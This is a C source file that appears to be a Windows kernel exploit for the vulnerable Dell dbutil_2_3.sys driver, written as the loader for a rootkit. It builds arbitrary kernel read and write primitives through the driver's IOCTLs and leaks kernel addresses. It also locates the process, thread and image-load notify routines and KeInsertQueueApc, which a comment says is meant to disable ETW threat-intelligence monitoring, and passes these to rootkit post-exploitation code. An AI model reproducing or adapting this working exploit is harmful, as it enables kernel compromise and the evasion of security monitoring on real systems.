#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>

// Include rootkit tools
#include "rktools.h"

// Dell dbutil_2_3.sys vulnerable IOCTLs
#define IOCTL_WRITE_CODE 0x9B0C1EC8
#define IOCTL_READ_CODE 0x9B0C1EC4

// Read primitive function
ULONGLONG readqword(HANDLE hDriver, ULONGLONG where) {
	ULONGLONG inBuf[4];

	// Construct input buffer
	ULONGLONG one = 0x1111111111111111;
	ULONGLONG two = where;
	ULONGLONG three = 0x0000000000000000;
	ULONGLONG four = 0x0000000000000000;

	inBuf[0] = one;
	inBuf[1] = two;
	inBuf[2] = three;
	inBuf[3] = four;
	DWORD bytesReturned = 0;

	// Call vulnerable IOCTL
	BOOL ret = DeviceIoControl(
		hDriver,
		IOCTL_READ_CODE,
		&inBuf,
		sizeof(inBuf),
		&inBuf,
		sizeof(inBuf),
		&bytesReturned,
		NULL
	);
	if (!ret)
	{
		printf("[-] Calling IOCTL failed: 0x%lx\n", GetLastError());
		return NULL;
	}

	// Last member of read array contains leaked bytes
	ULONGLONG read = inBuf[3];
	return read;
}


// Write primitive function
void writeqword(HANDLE hDriver, ULONGLONG where, ULONGLONG what) {
	ULONGLONG inBuf[4];

	// Construct input buffer
	ULONGLONG one = 0x1111111111111111;
	ULONGLONG two = where;
	ULONGLONG three = 0x0000000000000000;
	ULONGLONG four = what;

	inBuf[0] = one;
	inBuf[1] = two;
	inBuf[2] = three;
	inBuf[3] = four;
	DWORD bytesReturned = 0;

	// Call vulnerable IOCTL
	BOOL interact12 = DeviceIoControl(
		hDriver,
		IOCTL_WRITE_CODE,
		&inBuf,
		sizeof(inBuf),
		&inBuf,
		sizeof(inBuf),
		&bytesReturned,
		NULL
	);
}

// Obtain the kernel base and driver base (Requires medium integrity or higher)
ULONGLONG findKernelBase(const char* name)
{
	LPVOID lpImageBase[1024];
	DWORD lpcbNeeded;
	int drivers;
	char lpFileName[1024];
	ULONGLONG imageBase;

	// Enumerate loaded kernel drivers
	BOOL baseofDrivers = EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
	if (!baseofDrivers)
	{
		printf("[-] EnumDeviceDrivers failed with error: 0x%lx\n", GetLastError());
		return NULL;
	}
	drivers = lpcbNeeded / sizeof(lpImageBase[0]);

	// Iterate through names of loaded drivers
	for (int i = 0; i < drivers; i++)
	{
		GetDeviceDriverBaseNameA(
			lpImageBase[i],
			lpFileName,
			sizeof(lpFileName) / sizeof(char)
		);

		// Retrieve kernel base address for supplied driver name
		if (!strcmp(name, lpFileName))
		{
			imageBase = (ULONGLONG)lpImageBase[i];
			break;
		}
	}
	return imageBase;
}


int main() {
	//// INITIALIZE EXPLOIT AND ROOTKIT STRUCT ////
	// Obtain a handle to the vulnerable driver
	HANDLE hDriver = CreateFileA(
		"\\\\.\\DBUtil_2_3",
		FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE,
		0x0,
		NULL,
		OPEN_EXISTING,
		0x0,
		NULL
	);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[-] Error obtaining driver handle: 0x%lx\n", GetLastError());
		return false;
	}
	printf("[+] Obtained driver handle: 0x%llx\n", (ULONGLONG)hDriver);

	// Initialize rootkit struct
	PEXP_OUT rootStruct = new EXP_OUT;

	// Set read and write primitive functions
	rootStruct->readprimitive = (LPVOID)readqword;
	rootStruct->writeprimitive = (LPVOID)writeqword;

	// Obtain current process's PID
	DWORD myPid = GetCurrentProcessId();
	rootStruct->myProcessId = myPid;


	///// LEAK KERNEL MODE ADDRESSES FOR ROOTKIT POST EXPLOITATION /////
	// Obtain base address for ntoskrnl
	ULONGLONG ntosBase = findKernelBase("ntoskrnl.exe");
	printf("[*] Base address of ntoskrnl.exe: 0x%llx\n", ntosBase);

	// Load ntoskrnl into usermode memory to search for offsets to useful pointers
	HMODULE umodeNtoskrnl = LoadLibraryA("C:\\Windows\\System32\\ntoskrnl.exe");
	if (umodeNtoskrnl == NULL) {
		printf("[-] Error loading ntoskrnl: 0x%lx\n", GetLastError());
		return false;
	}
	printf("[+] Loaded ntoskrnl at 0x%llx\n", (ULONGLONG)umodeNtoskrnl);

	// Find offset to KeInsertQueueApc in ntoskrnl.exe to disable ETWti
	ULONGLONG KeInsertQueueApcAddr = 0;
	ULONGLONG KIQAoffset = (ULONGLONG)GetProcAddress(umodeNtoskrnl, "KeInsertQueueApc");
	if (KIQAoffset == 0) {
		printf("[-] Could not find KeInsertQueueApc in ntoskrnl\n");
	}	// Calculate pointer by subtracting user-mode base address of ntoskrnl, then adding its kernel-mode base address
	else {
		KeInsertQueueApcAddr = KIQAoffset - (ULONGLONG)umodeNtoskrnl + (ULONGLONG)ntosBase;
		printf("[*] Kernel pointer to KeInsertQueueApc: 0x%llx\n", KeInsertQueueApcAddr);
	}
	// Get address of nt!PsSetCreateProcessNotifyRoutine 
	ULONGLONG ProcCallbackAddr = 0;
	ULONGLONG ProcCallbackOffset = (ULONGLONG)GetProcAddress(umodeNtoskrnl, "PsSetCreateProcessNotifyRoutine");
	if (ProcCallbackOffset == 0) {
		printf("[-] Could not find PsSetCreateProcessNotifyRoutine in ntoskrnl\n");
	}	// Calculate pointer by subtracting user-mode base address of ntoskrnl, then adding its kernel-mode base address
	else {
		ProcCallbackAddr = ProcCallbackOffset - (ULONGLONG)umodeNtoskrnl + (ULONGLONG)ntosBase;
		printf("[*] Kernel pointer to PsSetCreateProcessNotifyRoutine: 0x%llx\n", ProcCallbackAddr);
	}
	// Get address of nt!PsSetCreateThreadNotifyRoutine 
	ULONGLONG ThreadCallbackAddr = 0;
	ULONGLONG ThreadCallbackOffset = (ULONGLONG)GetProcAddress(umodeNtoskrnl, "PsSetCreateThreadNotifyRoutine");
	if (ThreadCallbackOffset == 0) {
		printf("[-] Could not find PsSetCreateThreadNotifyRoutine in ntoskrnl\n");
	}	// Calculate pointer by subtracting user-mode base address of ntoskrnl, then adding its kernel-mode base address
	else {
		ThreadCallbackAddr = ThreadCallbackOffset - (ULONGLONG)umodeNtoskrnl + (ULONGLONG)ntosBase;
		printf("[*] Kernel pointer to PsSetCreateThreadNotifyRoutine: 0x%llx\n", ThreadCallbackAddr);
	}
	// Get address of nt!PsSetLoadImageNotifyRoutine 
	ULONGLONG DllCallbackAddr = 0;
	ULONGLONG DllCallbackOffset = (ULONGLONG)GetProcAddress(umodeNtoskrnl, "PsSetLoadImageNotifyRoutine");
	if (DllCallbackOffset == 0) {
		printf("[-] Could not find PsSetLoadImageNotifyRoutine in ntoskrnl\n");
	}	// Calculate pointer by subtracting user-mode base address of ntoskrnl, then adding its kernel-mode base address
	else {
		DllCallbackAddr = DllCallbackOffset - (ULONGLONG)umodeNtoskrnl + (ULONGLONG)ntosBase;
		printf("[*] Kernel pointer to PsSetLoadImageNotifyRoutine: 0x%llx\n", DllCallbackAddr);
	}

	// Find addresses
	rootStruct->KeInsertQueueApc = KeInsertQueueApcAddr;
	rootStruct->PsSetCreateProcessNotifyRoutine = ProcCallbackAddr;
	rootStruct->PsSetCreateThreadNotifyRoutine = ThreadCallbackAddr;
	rootStruct->PsSetLoadImageNotifyRoutine = DllCallbackAddr;

	// Pass vulnerable driver's handle to struct
	rootStruct->vulnDriver = hDriver;

	// Find PsInitialSystemProcess in ntoskrnl to get pointer to SYSTEM EPROCESS (dereference with read primitive)
	ULONGLONG systemProcessOffset = (ULONGLONG)GetProcAddress(umodeNtoskrnl, "PsInitialSystemProcess");
	if (systemProcessOffset == 0) {
		printf("[-] Could not find PsInitialSystemProcess in ntoskrnl\n");
		return false;
	}
	ULONGLONG systemProcessPtr = systemProcessOffset - (ULONGLONG)umodeNtoskrnl + (ULONGLONG)ntosBase;
	printf("[*] Kernel pointer to PsInitialSystemProcess: 0x%llx\n", systemProcessPtr);

	// Dereference pointer from PsInitialSystemProcess
	ULONGLONG systemProcess = readqword(hDriver, systemProcessPtr);

	// Set SYSTEM EPROCESS pointer
	rootStruct->systemEprocess = systemProcess;


	//// ENTER ROOTKIT POST-EXPLOITATION FUNCTIONALITY ////
	// Call rootkit functionality for post-exploitation
	rootk(rootStruct);	

	// Clean up and exit //
	delete rootStruct;
	return true;

}
